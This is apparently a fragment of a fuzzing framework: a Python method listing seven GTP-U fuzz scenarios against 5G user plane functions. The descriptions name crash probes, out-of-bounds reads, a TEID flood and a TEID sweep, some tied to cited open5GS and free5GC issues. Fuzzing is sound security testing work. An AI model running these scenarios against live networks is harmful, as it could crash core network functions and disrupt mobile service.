    def get_fuzz_scenarios(self) -> List[FuzzScenario]:
        return [
            FuzzScenario(
                name='gtpu_unknown_teid_flood',
                description='Flood UPF with unknown TEID G-PDUs — crash or Error Indication storm',
                setup_messages=[],
                fuzz_message='g_pdu_unknown_teid',
            ),
            FuzzScenario(
                name='gtpu_ext_hdr_zero_len',
                description='Extension header length=0 crash probe (open5GS #3891)',
                setup_messages=['echo_request'],
                fuzz_message='g_pdu_ext_hdr_zero_len',
            ),
            FuzzScenario(
                name='gtpu_ext_hdr_overflow',
                description='Extension header OOB read probe (open5GS #3892)',
                setup_messages=['echo_request'],
                fuzz_message='g_pdu_ext_hdr_overflow',
            ),
            FuzzScenario(
                name='gtpu_pdu_sess_short',
                description='PDU Session Container short body panic (free5GC #502)',
                setup_messages=[],
                fuzz_message='g_pdu_ext_hdr_pdu_sess_short',
            ),
            FuzzScenario(
                name='gtpu_overflow_length',
                description='Declared length overflow → OOB read (free5GC #601)',
                setup_messages=[],
                fuzz_message='g_pdu_overflow_length',
            ),
            FuzzScenario(
                name='gtpu_teid_sweep',
                description='Sweep TEID values via semantic field — find allocated TEIDs',
                setup_messages=['echo_request'],
                fuzz_message='g_pdu_teid_sweep',
            ),
            FuzzScenario(
                name='gtpu_end_marker_race',
                description='End Marker followed by G-PDU on same TEID — dangling reference',
                setup_messages=['end_marker'],
                fuzz_message='g_pdu_valid',
            ),
        ]
